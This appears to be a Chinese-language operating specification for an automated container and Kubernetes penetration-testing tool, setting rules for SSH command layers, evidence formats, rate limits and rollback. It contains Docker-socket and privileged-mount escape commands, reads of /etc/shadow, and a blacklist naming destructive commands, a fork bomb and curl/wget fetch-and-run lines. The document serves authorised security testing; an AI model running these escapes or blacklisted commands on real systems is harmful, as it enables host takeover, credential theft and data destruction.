# SSH 命令使用规范（SSH_COMMANDS）

> 适用范围：所有需要 SSH 执行的子技能（recon、k8s-compliance、docker-compliance、containerd-compliance、attack-pattern、attack-reasoning、chain-verify）。
> 来源：设计文档 `2026-06-20-GenCPT-v3-design.md` 第 1.2 节（攻击者视角分层）、第 5.13 节（限速与重试）、第 5.15 节（方法C工具库）、第 5.16 节（层级与可信度）。
> 约束力：**强制**。违反将导致上下文标注错乱、审计追溯失败或生产环境受损。

---

## 1. SSH 命令使用规范

### 1.1 执行方式

所有命令通过 **ssh-manager MCP 工具**执行：

| 场景 | 工具 | 说明 |
|------|------|------|
| 普通命令（L0/L1/只读） | `ssh_execute` | 默认执行方式，不需要提权 |
| 需要 sudo 的命令 | `ssh_execute_sudo` | 仅 L0 侦察和条件核实，绝不在 L1/L2 中使用 sudo |
| 批量多服务器执行 | `ssh_execute_group` | 仅合规检测分批执行场景 |

### 1.2 执行上下文标注

每条命令 **必须** 标注来源层级：

| 标注 | 含义 | 执行方式 | 权限 |
|------|------|---------|------|
| `[L0]` | 宿主机观察 | `ssh_execute` / `ssh_execute_sudo` 直接在宿主机执行 | 可用 sudo |
| `[L1]` | 容器内观察 | `ssh_execute` + `kubectl exec <pod> -- <command>` | 容器内进程权限 |
| `[L2]` | 容器内攻击验证 | `ssh_execute` + `kubectl exec <pod> -- <attack_command>` | 容器内进程权限，需差分框架 |
| `[L3]` | 条件验证 | 不执行破坏性命令，标注 ⚠️ 理论推导 | N/A |

### 1.3 命令原则

1. **幂等性**：L0/L1 命令必须幂等、只读，多次执行产生相同结果
2. **只读优先**：除 L2 差分验证外，所有命令不修改系统状态
3. **真实执行**：不准伪造 SSH 输出——所有检测结果必须由 `ssh_execute` 真实执行产生
4. **反幻觉**：不准凭记忆出攻击结果——攻击验证的每条命令必须从攻击模式库或攻击假设库中查到出处

### 1.4 输出捕获格式

**L0/L1 命令**（五元组）：

```
命令 | 来源(L0/L1) | 输出 | 时间戳 | 备注
```

示例：
```
kubectl get nodes -o wide | L0 | node1 Ready control-plane 5d | 2026-06-20T10:15:30Z | 3节点集群
```

**L2 命令**（六元组）：

```
命令 | 来源(L2) | 输出 | 差分对比 | 时间戳 | 回滚确认
```

示例：
```
kubectl exec -n prod backend-api -- docker run -v /:/host alpine ls /host/etc/shadow | L2 | root:x:0:0:... | 攻击前不可读→攻击后可读 | 2026-06-20T10:20:15Z | ✅ 已清理临时容器
```

---

## 2. L0 命令集（宿主机观察）

> 通过 SSH 在宿主机直接执行。用于发现前置条件、收集配置信息、差分对比。

### 2.1 系统信息

```bash
[L0] uname -a                                         # 内核版本、架构
[L0] cat /etc/os-release                              # 操作系统发行版
[L0] hostnamectl                                      # 主机名、虚拟化类型（如 vsphere/kvm）
[L0] uptime                                           # 运行时间、负载
```

### 2.2 容器运行时检测

```bash
[L0] docker version                                   # Docker 版本（Client + Server）
[L0] docker info                                      # Docker 详细配置（Cgroup、Storage、Security）
[L0] containerd --version                             # containerd 版本
[L0] crictl --version                                 # crictl 版本
[L0] runc --version                                   # runc 版本
```

### 2.3 Kubernetes 检测

```bash
[L0] kubectl version -o yaml                          # K8s 版本（Client + Server）
[L0] kubectl cluster-info                              # 集群端点信息
[L0] kubectl get nodes -o wide                         # 节点列表（含角色、版本、IP、OS）
[L0] kubectl get nodes -o jsonpath='{.items[*].status.nodeInfo}'  # 节点系统信息
```

### 2.4 网络配置

```bash
[L0] ip addr                                           # 网络接口与 IP 地址
[L0] ip route                                          # 路由表
[L0] iptables -L -n                                    # 防火墙规则（需 sudo）
[L0] iptables -t nat -L -n                             # NAT 规则（需 sudo）
[L0] ss -tulnp                                         # 监听端口（需 sudo 查看进程名）
[L0] cat /etc/resolv.conf                              # DNS 配置
```

### 2.5 挂载信息

```bash
[L0] mount                                             # 当前挂载点
[L0] findmnt                                           # 挂载树视图
[L0] cat /proc/mounts                                  # 内核挂载表
```

### 2.6 安全模块

```bash
[L0] getenforce                                        # SELinux 状态（Enforcing/Permissive/Disabled）
[L0] sestatus                                          # SELinux 详细配置（需 sudo）
[L0] aa-status                                         # AppArmor 状态（需 sudo）
[L0] cat /proc/sys/kernel/yama/ptrace_scope            # ptrace 限制
[L0] cat /proc/sys/kernel/unprivileged_bpf_disabled    # eBPF 限制
[L0] sysctl kernel.kexec_load kernel.modules_disabled  # 内核模块加载限制（需 sudo）
```

### 2.7 进程可见性

```bash
[L0] ps aux                                            # 进程列表
[L0] ps -ef --forest                                   # 进程树（显示父子关系）
```

### 2.8 多节点检查命令模板

通过 master 跳转到 worker 节点检查（假设 master 到 worker SSH 免密）：
```bash
[L0] ssh_execute(server, "ssh <worker_ip> stat -c '%a' /var/lib/kubelet/config.yaml")
[L0] ssh_execute(server, "ssh <worker_ip> ps -ef | grep kubelet | grep -v grep")
[L0] ssh_execute(server, "ssh <worker_ip> cat /var/lib/kubelet/config.yaml 2>/dev/null")
```

**约束**：
- 跳转 SSH 命令同样遵守限速规则（最大并行3、间隔2秒）
- worker 节点不可达时标记 `[!] 环境干扰`，不阻塞检测
- 不在 worker 节点上上传任何文件或安装任何工具

---

## 3. L1 命令集（容器内观察）

> 通过 `kubectl exec` 进入目标 Pod 执行，验证攻击者视角可见性。所有命令使用：
> `ssh_execute(server, "kubectl exec -n <namespace> <pod> -- <command>")`

### 3.1 Kubectl Exec 入口模板

```bash
# 进入容器（交互式 — 仅用于临时调试，正式检测用单条命令）
ssh_execute(server, "kubectl exec -n <namespace> <pod> -- <command>")

# 指定容器（多容器 Pod）
ssh_execute(server, "kubectl exec -n <namespace> <pod> -c <container> -- <command>")
```

### 3.2 容器身份

```bash
[L1] kubectl exec -n <ns> <pod> -- whoami              # 当前用户
[L1] kubectl exec -n <ns> <pod> -- id                   # 用户 ID、组 ID
[L1] kubectl exec -n <ns> <pod> -- cat /proc/1/cgroup    # 确认是否在容器内
[L1] kubectl exec -n <ns> <pod> -- cat /proc/self/status  # 容器进程状态（含 CapEff）
```

### 3.3 能力检测

```bash
[L1] kubectl exec -n <ns> <pod> -- capsh --print                     # 完整能力列表（如 capsh 可用）
[L1] kubectl exec -n <ns> <pod> -- cat /proc/self/status | grep Cap  # 能力位掩码
# CapEff 解码：取 CapEff 值后用 capsh --decode=<hex> 在宿主机解码
[L0] capsh --decode=<CapEff_hex>                                    # 宿主机解码容器能力
```

### 3.4 文件系统

```bash
[L1] kubectl exec -n <ns> <pod> -- ls -la /                       # 根文件系统
[L1] kubectl exec -n <ns> <pod> -- cat /proc/mounts                # 容器内挂载信息
[L1] kubectl exec -n <ns> <pod> -- df -h                           # 磁盘使用
[L1] kubectl exec -n <ns> <pod> -- ls -la /var/run/docker.sock     # Docker socket 可见性
[L1] kubectl exec -n <ns> <pod> -- ls -la /run/containerd/         # containerd socket
[L1] kubectl exec -n <ns> <pod> -- ls -la /dev                     # 设备文件可见性
```

### 3.5 网络工具

```bash
[L1] kubectl exec -n <ns> <pod> -- ip addr                         # 容器网络接口
[L1] kubectl exec -n <ns> <pod> -- ip route                         # 容器路由表
[L1] kubectl exec -n <ns> <pod> -- cat /etc/resolv.conf            # 容器 DNS 配置
[L1] kubectl exec -n <ns> <pod> -- cat /proc/net/tcp               # TCP 连接
[L1] kubectl exec -n <ns> <pod> -- cat /proc/net/tcp6               # IPv6 TCP 连接
```

### 3.6 环境变量与凭据

```bash
[L1] kubectl exec -n <ns> <pod> -- env                             # 容器环境变量
[L1] kubectl exec -n <ns> <pod> -- cat /proc/1/environ | tr '\0' '\n'  # PID 1 环境变量
[L1] kubectl exec -n <ns> <pod> -- ls -la /var/run/secrets/kubernetes.io/serviceaccount/  # SA token 可见性
```

---

## 4. L2 命令集（容器内攻击验证）

> **⚠️ L2 命令仅在"L2 差分证明"框架内执行。** 所有 L2 命令必须满足：
> 1. 来源：攻击模式库或攻击假设库中明确定义
> 2. 框架：执行前记录基线状态，执行后记录变化状态
> 3. 回滚：每条 L2 命令必须配套回滚/恢复命令
> 4. 审批：破坏性操作须通过审批门控

### 4.1 L2 差分证明框架

```
┌─────────────────────────────────────────────────┐
│              L2 差分证明框架                      │
├─────────────────────────────────────────────────┤
│                                                 │
│  1. 基线记录（攻击前状态）                        │
│     记录关键指标（进程列表、文件存在性、网络状态）  │
│                                                 │
│  2. 执行攻击命令                                 │
│     kubectl exec ... -- <attack_command>         │
│                                                 │
│  3. 差分对比（攻击后状态）                        │
│     对比基线，确认攻击是否产生预期变化             │
│                                                 │
│  4. 回滚/清理                                    │
│     恢复攻击前状态，删除临时容器/文件             │
│                                                 │
└─────────────────────────────────────────────────┘
```

### 4.2 差分命令模板

```bash
# ─── 第1步：基线记录 ───
[L0] docker ps --format '{{.ID}} {{.Names}} {{.Status}}'              # 记录当前容器列表
[L0] docker ps -a --filter "status=running" | wc -l                   # 记录运行容器数

# ─── 第2步：执行攻击验证 ───
[L2] kubectl exec -n <ns> <pod> -- <attack_command>                   # 执行攻击命令

# ─── 第3步：差分对比 ───
[L0] docker ps --format '{{.ID}} {{.Names}} {{.Status}}'              # 对比容器列表变化
[L1] kubectl exec -n <ns> <pod> -- <read_command>                     # 对比容器内变化

# ─── 第4步：回滚/清理 ───
[L2] kubectl exec -n <ns> <pod> -- <rollback_command>                 # 清理攻击痕迹
```

### 4.3 常见 L2 攻击验证示例

**Docker Socket 逃逸**：

```bash
# 基线 [L0]
ssh_execute(server, "docker ps --format '{{.ID}} {{.Names}}'")
# 攻击 [L2]
ssh_execute(server, "kubectl exec -n <ns> <pod> -- docker run -v /:/host alpine ls /host/etc/shadow")
# 差分 [L0] — 确认新容器出现
ssh_execute(server, "docker ps --format '{{.ID}} {{.Names}}' | grep alpine")
# 回滚 [L2]
ssh_execute(server, "kubectl exec -n <ns> <pod> -- docker rm -f <container_id>")
```

**特权容器能力检查**：

```bash
# 基线 [L1]
ssh_execute(server, "kubectl exec -n <ns> <pod> -- cat /proc/self/status | grep Cap")
# 攻击 [L2] — 尝试挂载宿主机文件系统
ssh_execute(server, "kubectl exec -n <ns> <pod> -- mount /dev/sda1 /mnt 2>&1 || true")
# 差分 [L1]
ssh_execute(server, "kubectl exec -n <ns> <pod> -- mount | grep /dev/sda1")
# 回滚 [L2]
ssh_execute(server, "kubectl exec -n <ns> <pod> -- umount /mnt 2>/dev/null || true")
```

**网络横向移动**：

```bash
# 基线 [L1]
ssh_execute(server, "kubectl exec -n <ns> <pod> -- cat /proc/net/tcp")
# 验证 [L2] — 网络可达性探测
ssh_execute(server, "kubectl exec -n <ns> <pod> -- curl -s -o /dev/null -w '%{http_code}' http://<target_ip>:<port>/ --connect-timeout 3")
# 差分 [L1]
ssh_execute(server, "kubectl exec -n <ns> <pod> -- cat /proc/net/tcp")
# 无需回滚（curl 探测无副作用）
```

### 4.4 L2 执行规则

| 规则 | 说明 |
|------|------|
| **来源约束** | L2 命令必须来自攻击模式库（`attack-patterns/*/SKILL.md`）明确定义 |
| **差分必须** | 不允许无差分对比的 L2 命令 |
| **回滚必须** | 每个 L2 攻击命令必须配对回滚命令，回滚命令本身也可写入模板 |
| **审批门控** | 破坏性操作（Level 4-5）需通过审批确认 |
| **幂等回滚** | 回滚命令必须幂等（如 `docker rm -f` 而非 `docker stop && docker rm`） |

---

## 5. 命令安全性规则

### 5.1 按层级的安全性约束

| 层级 | 约束 | 说明 |
|------|------|------|
| **L0** | 只读，不修改系统状态 | 侦察和条件收集，允许 `ls`、`cat`、`kubectl get`、`docker inspect` 等 |
| **L1** | 只读，不修改系统状态 | 容器内观察，允许 `ls`、`cat`、`env`、`ip` 等，禁止安装软件 |
| **L2** | 需差分框架和回滚计划 | 攻击验证命令必须在差分框架内，且配对回滚命令 |
| **L3** | ⚠️ 理论推导，不实际执行 | 不可安全复现的操作（如 DoS、fork bomb），只标注条件和理论路径 |

### 5.2 禁止命令黑名单

以下命令 **绝对禁止** 执行，无论在哪个层级：

```
rm -rf /
dd if=/dev/zero of=/dev/sda
:(){ :|:& };:                          # fork bomb
mkfs.ext4 /dev/sda
shutdown / reboot / halt
iptables -F                             # 清空防火墙规则
echo "" > /etc/shadow                   # 破坏密码文件
chmod -R 777 /
curl http://malicious.url | bash
wget http://malicious.url -O /tmp/x && chmod +x /tmp/x && /tmp/x
```

**L3 条件验证类**标注 ⚠️ 理论推导，**不实际执行**：

```
⚠️ :(){ :|:& };:                       # fork bomb — 仅条件验证，绝不执行
⚠️ dd if=/dev/zero of=/dev/null        # 资源耗尽型 — 仅条件验证
⚠️ mkfs.ext4 /dev/sda                   # 破坏性 — 仅条件验证
```

### 5.3 Sudo 使用规范

| 场景 | 是否允许 sudo | 说明 |
|------|-------------|------|
| L0 侦察：`iptables -L -n` | ✅ 允许 | 需 sudo 才能查看完整规则 |
| L0 侦察：`sestatus` | ✅ 允许 | 需 sudo 获取 SELinux 详情 |
| L0 侦察：`cat /etc/shadow` | ✅ 允许 | 确认 shadow 文件权限配置 |
| L0 侦察：`capsh --decode` | ✅ 允许 | 解码能力位 |
| L1 容器内观察 | ❌ 禁止 sudo | L1 模拟容器内攻击者视角，攻击者无 sudo |
| L2 容器内攻击验证 | ❌ 禁止 sudo | 同 L1，攻击者视角不使用宿主机特权 |
| L3 条件验证 | ❌ 不执行 | L3 不实际执行命令 |

**原则**：SSH root 权限只用于 L0 侦察和条件核实，**不用于替代攻击者视角验证**。

### 5.4 命令限速与重试

**限速规则**（源自设计文档 5.13 节）：

| 参数 | 值 |
|------|-----|
| 最大并行 SSH 命令数 | 3（同一服务器） |
| 批次间隔 | 2 秒 |
| 单次 SSH 超时 | 30 秒 |

如果 `ssh_execute` 返回 "rate limited" 或 "too many connections"：
- 自动降级为串行，批次间隔从 2 秒升至 5 秒
- 记录到 `progress.json` 的 `throttle_events`

**重试策略**：

| 命令类型 | 重试次数 | 间隔 | 失败标记 |
|---------|---------|------|---------|
| 读命令（ls/cat/kubectl get） | 3 | 2秒 | `[!]` |
| 探测命令（curl/nc/kubectl auth can-i） | 2 | 3秒 | `[!]`，区分"连接超时"和"连接拒绝" |
| 攻击验证命令 | 1 | 5秒 | ATK-CAND 降级为高风险线索 |
| 写入命令（docker run 临时容器等） | 0 | 不重试 | `[!]`（环境干扰，可能已部分生效） |

---

## 6. OS/架构适配

### 6.1 环境指纹收集

Phase 1a 侦察时，优先收集 OS 和架构信息写入 `session_config.json`：

```json
{
  "env_fingerprint": {
    "os_type": "linux",
    "arch": "amd64",
    "kernel_version": "5.15.0-91-generic",
    "k8s_version": "1.29.0",
    "docker_version": "24.0.7"
  }
}
```

收集命令：

```bash
[L0] uname -m                          # 架构（x86_64 / aarch64 / mips64）
[L0] cat /etc/os-release                # 发行版（ubuntu / alpine / centos / ...）
[L0] uname -r                           # 内核版本
```

### 6.2 Alpine/BusyBox 命令替代表

容器环境常使用 Alpine 或 BusyBox，部分标准 Linux 命令不可用：

| 标准命令 | Alpine/BusyBox 替代 | 说明 |
|---------|---------------------|------|
| `capsh --print` | `cat /proc/self/status \| grep Cap` | BusyBox 无 capsh |
| `capsh --decode=xxx` | 宿主机解码：`[L0] capsh --decode=xxx` | 容器内无 capsh，在宿主机解码 |
| `ip addr` | `ifconfig` 或 `cat /proc/net/dev` | BusyBox 可能无 `ip` 命令 |
| `ip route` | `route -n` 或 `cat /proc/net/route` | BusyBox 可能无 `ip` |
| `ss -tulnp` | `netstat -tulnp` 或 `cat /proc/net/tcp` | BusyBox 无 `ss` |
| `iptables -L -n` | `cat /proc/net/ip_tables_targets` | 容器内通常无 iptables |
| `systemctl` | `cat /proc/1/cmdline` 或 `ls /etc/init.d/` | Alpine 无 systemd |
| `hostnamectl` | `cat /etc/hostname` 或 `hostname` | Alpine 无 hostnamectl |
| `ps -ef --forest` | `ps auxf` 或 `ps -ef` | BusyBox ps 功能有限 |
| `findmnt` | `cat /proc/mounts` 或 `mount` | BusyBox 无 findmnt |
| `jq` | `python3 -c "import json,sys; ..."` 或上传 jq | 容器内通常无 jq |
| `yq` | 上传 yq 或 `python3 -c "import yaml,sys; ..."` | 容器内通常无 yq |

### 6.3 ARM64/AMD64 差异处理

| 场景 | AMD64 | ARM64 | 处理 |
|------|-------|-------|------|
| 二进制工具上传路径 | `tools/linux-amd64/` | `tools/linux-arm64/` | Phase 1a 收集架构后选择 |
| CapEff 解码 | `capsh --decode=<hex>` | 相同 | 能力位相同语义，数值一致 |
| Docker 官方镜像 | `alpine:latest` (amd64) | `alpine:latest` (arm64) | Docker 自动拉取匹配架构 |
| kubectl | amd64 二进制 | arm64 二进制 | 需确认远端 kubectl 架构 |

### 6.4 Fallback 策略

当命令不存在时的降级处理顺序：

```
1. 尝试标准命令
   ↓ 失败（command not found）
2. 尝试 Alpine/BusyBox 替代命令
   ↓ 失败
3. 尝试 /proc 文件系统读取
   ↓ 失败
4. 上传工具（从 tools/<os_type>-<arch>/ 目录）
   ↓ 失败（工具上传失败或无对应二进制）
5. 记录到证据：[!] 命令不可用，标记为 N/A
   继续后续检测，不阻塞流程
```

关键原则：
- 工具上传失败 **不阻塞** 流程，回退到 `fallback_native` 原生命令
- 记录到 `evidence/tool_upload_log.md`：工具名、版本、失败原因、时间戳
- 在报告中标注"工具覆盖受限"

---

## 7. 输出标注格式

### 7.1 标准格式（L0/L1）

**五元组**：

| 字段 | 格式 | 说明 |
|------|------|------|
| 命令 | 原始命令字符串 | 可复现 |
| 来源 | L0 / L1 | 执行上下文层级 |
| 输出 | 截断至关键部分 | 不省略关键行，不用"等"概括 |
| 时间戳 | ISO 8601（`2026-06-20T10:15:30Z`） | 执行时间 |
| 备注 | 补充说明 | 简要点评 |

记录到 `evidence/` 目录示例：

```markdown
## [L0] 系统信息
| 命令 | 来源 | 输出 | 时间戳 | 备注 |
|------|------|------|--------|------|
| `uname -a` | L0 | Linux node1 5.15.0-91-generic #101-Ubuntu SMP ... | 2026-06-20T10:15:30Z | 内核5.15 |
| `cat /etc/os-release` | L0 | NAME="Ubuntu" VERSION="22.04.3 LTS (Jammy Jellyfish)" | 2026-06-20T10:15:31Z | Ubuntu 22.04 |

## [L1] 容器内观察
| 命令 | 来源 | 输出 | 时间戳 | 备注 |
|------|------|------|--------|------|
| `kubectl exec -n prod backend-api -- cat /proc/1/cgroup` | L1 | 12:memory:/kubepods/burstable/pod123/... | 2026-06-20T10:16:01Z | 确认在容器内 |
```

### 7.2 L2 差分格式

**六元组**：

| 字段 | 格式 | 说明 |
|------|------|------|
| 命令 | 原始命令字符串 | 含攻击命令 |
| 来源 | L2 | 固定值 |
| 输出 | 截断至关键部分 | 差分对比证据 |
| 差分对比 | `攻击前状态 → 攻击后状态` | 明确变化证明 |
| 时间戳 | ISO 8601 | 执行时间 |
| 回滚确认 | ✅ 已清理 / ❌ 未能清理 | 必须回填 |

记录到 `evidence/` 目录示例：

```markdown
## [L2] Docker Socket 逃逸验证
| 命令 | 来源 | 输出 | 差分对比 | 时间戳 | 回滚确认 |
|------|------|------|---------|--------|---------|
| `kubectl exec -n prod backend-api -- docker run -v /:/host alpine ls /host/etc/shadow` | L2 | root:x:0:0:root:/root:/bin/sh... | 攻击前不可读 → 攻击后可读取宿主机shadow | 2026-06-20T10:20:15Z | ✅ 已清理临时容器 |
| `kubectl exec -n prod backend-api -- docker rm -f abc123def` | L2 | abc123def | 清理临时容器 | 2026-06-20T10:20:18Z | ✅ 回滚完成 |
```

### 7.3 L3 条件验证格式

L3 不执行破坏性命令，只记录条件组合和理论分析：

```markdown
## [L3] 条件验证：特权容器 + 无资源限制 → DoS 风险
验证层级: L3 条件验证 ⚠️
不可安全复现原因: 实际执行 fork bomb 会导致宿主机 CPU 资源耗尽

### 前置条件证据
| 条件 | 命令 | 来源 | 输出 | 时间戳 | 备注 |
|------|------|------|------|--------|------|
| 特权容器 | `kubectl get pod xxx -o jsonpath='{.spec.securityContext.privileged}'` | L0 | true | 2026-06-20T10:25:01Z | 满足 |
| 无资源限制 | `kubectl get pod xxx -o jsonpath='{.spec.containers[0].resources}'` | L0 | {} | 2026-06-20T10:25:02Z | 满足 |

### ⚠️ 理论攻击路径（不实际执行）
在特权容器内执行: :(){ :|:& };:
预期影响: 宿主机 CPU 资源耗尽，所有 Pod 受影响

### 替代证据
| 命令 | 来源 | 输出 | 时间戳 | 备注 |
|------|------|------|--------|------|
| `cat /proc/sys/kernel/pids_limit` | L1 | max 32768 | 2026-06-20T10:25:03Z | PID 有限制 |
| `cat /sys/fs/cgroup/pids/max` | L1 | max 4096 | 2026-06-20T10:25:04Z | Cgroup PID 有限制 |
```

### 7.4 反幻觉硬约束

输出标注必须遵守以下规则（源自设计文档 1.2 节）：

1. **不准省略** — 不用"等"、"..."、"+N"、模糊概括
2. **不准占位** — 所有 `【xxx】` 必须替换为实际值
3. **不准伪造** — 所有输出必须由 `ssh_execute` 真实执行产生
4. **不准凭记忆** — 攻击验证命令必须从攻击模式库查到出处
5. **无证据不确认** — 只有满足确认门槛的候选才能写入确认态
6. **超出审批立即停** — 审批被拒绝时不得继续执行该攻击路径